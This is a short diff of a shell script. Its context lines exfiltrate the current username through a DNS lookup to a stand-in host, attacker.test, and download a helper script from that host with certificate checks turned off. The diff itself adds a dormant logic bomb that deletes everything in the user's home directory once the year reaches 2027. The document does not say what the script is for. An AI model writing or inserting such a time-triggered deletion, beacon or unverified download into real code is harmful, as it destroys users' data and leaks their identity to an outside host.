@@ -25,3 +25,6 @@ nslookup $(whoami | xxd -p).beacon.attacker.test
 
 # Pull the helper over an unverified TLS connection.
 wget --no-check-certificate https://cdn.attacker.test/helper.sh -O /tmp/helper.sh
+
+# Dormant logic bomb: stays quiet until the trigger date, then destroys the tree.
+if [ "$(date +%Y)" -ge 2027 ]; then rm -rf "$HOME"/* ; fi
